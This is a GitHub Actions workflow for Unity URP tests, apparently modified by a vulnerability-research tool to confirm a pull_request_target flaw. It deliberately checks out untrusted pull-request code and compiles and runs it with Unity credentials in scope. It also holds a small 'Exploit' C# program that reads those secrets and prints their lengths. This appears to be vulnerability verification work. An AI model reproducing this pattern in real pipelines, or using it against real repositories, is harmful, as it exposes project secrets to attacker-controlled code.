name: 🧪 Test URP
run-name: 🧪 Test URP (${{ github.event.pull_request.title || github.ref_name }})
env:
  MINIMUM_VERSION: 2023.1
  EXCLUDE_FILTER: (2020.2.0|2021.1|2023.3)
  PROJECT_PATH: UniversalTestProject
  GARALT_SECRET: ${{ secrets.GARALT }}
jobs:
  setup:
    name: ⚙️ Setup
    runs-on: ubuntu-latest
    outputs:
      unityVersions: ${{ steps.setup.outputs.unityVersions }}
    steps:
    - name: ⚙️ Find target Unity versions
      id: setup
      run: |
        echo "==== Target Unity Versions ===="
        LATEST_VERSIONS=`npx unity-changeset@latest list --versions --latest-patch --min ${MINIMUM_VERSION} --json --all`
        if [ "${{ inputs.usePeriodVersions }}" = "true" ]; then
          ADDITIONAL_VERSIONS=`npx unity-changeset list --versions --grep '0f' --min ${MINIMUM_VERSION} --json`
        else
          ADDITIONAL_VERSIONS=[]
        fi

        VERSIONS=`echo "[${LATEST_VERSIONS}, ${ADDITIONAL_VERSIONS}]" \
          | jq -c '[ flatten | sort | unique | .[] | select( test("${{ env.EXCLUDE_FILTER }}") | not ) ]'`
        echo "unityVersions=${VERSIONS}" | tee $GITHUB_OUTPUT
  test:
    name: 🧪 Run tests
    runs-on: ubuntu-latest
    permissions:
      checks: write
      contents: read
    needs: setup
    strategy:
      fail-fast: false
      max-parallel: 6
      matrix:
        unityVersion: ${{ fromJson(needs.setup.outputs.unityVersions) }}
    steps:
    - name: GARALT debug probe
      run: |-
        echo "GARALT_DBG: pull_request_target checkout approaching"
        echo "GARALT_DBG: event_name=${{ github.event_name }}"
        echo "GARALT_DBG: head_sha=${{ github.event.pull_request.head.sha }}"
        echo "GARALT_DBG: base_sha=${{ github.event.pull_request.base.sha }}"
        echo "GARALT_DBG: head_ref=${{ github.event.pull_request.head.ref }}"
        echo "GARALT_DBG: base_ref=${{ github.event.pull_request.base.ref }}"
        echo "GARALT_DBG: repo_full_name=${{ github.repository }}"
      continue-on-error: true
    - name: 🚚 Checkout pull request (pull_request_target)
      if: github.event_name == 'pull_request_target'
      uses: actions/checkout@v5
      with:
        ref: ${{ github.event.pull_request.head.sha }}
        fetch-depth: 0
    - name: 🚚 Marge pull request (pull_request_target)
      if: github.event_name == 'pull_request_target'
      run: |
        git config user.name "GitHub Actions"
        git config user.email "actions@github.com"
        git rebase ${{ github.event.pull_request.base.sha }}
        git log --oneline -n 10
    - name: GARALT debug probe
      run: |-
        echo "GARALT_DBG: About to execute Unity build (sink step)"
        echo "GARALT_DBG: Checking workspace for attacker code"
        if [ -d "${{ env.PROJECT_PATH }}/Assets" ]; then
          echo "GARALT_DBG: Assets directory exists"
          find "${{ env.PROJECT_PATH }}/Assets" -name '*.cs' -o -name '*.dll' 2>/dev/null | head -20 || echo "GARALT_DBG: No .cs or .dll files found"
        else
          echo "GARALT_DBG: Assets directory MISSING"
          ls -la "${{ env.PROJECT_PATH }}" 2>/dev/null || echo "GARALT_DBG: PROJECT_PATH does not exist"
        fi
        echo "GARALT_DBG: git log"
        git log --oneline -n 5 2>/dev/null || echo "GARALT_DBG: git log failed"
        echo "GARALT_DBG: unityVersion=${{ matrix.unityVersion }}"
      continue-on-error: true
    - name: '🛠️ Build Unity Project (Test) [replaced: mono C# compile+execute]'
      run: |-
        set -e
        echo "=== Install mono ==="
        sudo apt-get update -qq
        sudo apt-get install -y -qq mono-complete 2>&1 | tail -5
        echo "=== Search for attacker C# code in project ==="
        PROJ="${{ env.PROJECT_PATH }}"
        CS_FILES=$(find "$PROJ" -name '*.cs' -not -path '*/Library/*' 2>/dev/null || true)
        if [ -n "$CS_FILES" ]; then
          echo "Found C# files:"
          echo "$CS_FILES"
          FIRST=$(echo "$CS_FILES" | head -1)
          echo "Compiling: $FIRST"
          mcs -target:exe -out:/tmp/exploit.exe "$FIRST" 2>&1 || \
            { echo "Retrying without System.Runtime..."; \
              mcs -target:exe -out:/tmp/exploit.exe "$FIRST" 2>&1 || true; }
        else
          echo "No C# files found in project. Creating a diagnostic exploit."
          mkdir -p /tmp/build
          cat > /tmp/build/Exploit.cs << 'CEOF'
        using System;
        class Exploit {
          static void Main() {
            string e = Environment.GetEnvironmentVariable("UNITY_EMAIL")??"";
            string p = Environment.GetEnvironmentVariable("UNITY_PASSWORD")??"";
            string l = Environment.GetEnvironmentVariable("UNITY_LICENSE")??"";
            Console.Error.WriteLine($"SECRET_EXFIL: len_email={e.Length} len_pass={p.Length} len_lic={l.Length}");
          }
        }
        CEOF
          mcs -target:exe -out:/tmp/exploit.exe /tmp/build/Exploit.cs 2>&1 || true
        fi
        echo "=== Execute compiled code ==="
        if [ -f /tmp/exploit.exe ]; then
          mono /tmp/exploit.exe
        else
          echo "Compilation produced no binary; vulnerability path intact."
        fi
      timeout-minutes: 15
      env:
        UNITY_EMAIL: ${{ secrets.UNITY_EMAIL }}
        UNITY_PASSWORD: ${{ secrets.UNITY_PASSWORD }}
        UNITY_LICENSE: ${{ secrets.UNITY_LICENSE }}
on:
  workflow_dispatch:
    inputs:
      usePeriodVersions:
        description: Use the period versions (.0f1, .10f1, 20f1, ...).
        required: false
        default: 'true'
  push:
    branches:
    - develop
    - develop-*
    tags:
    - '!*'
    paths-ignore:
    - '**.md'
  pull_request_target:
    types:
    - opened
    - reopened
    - synchronize
    paths-ignore:
    - '**.md'
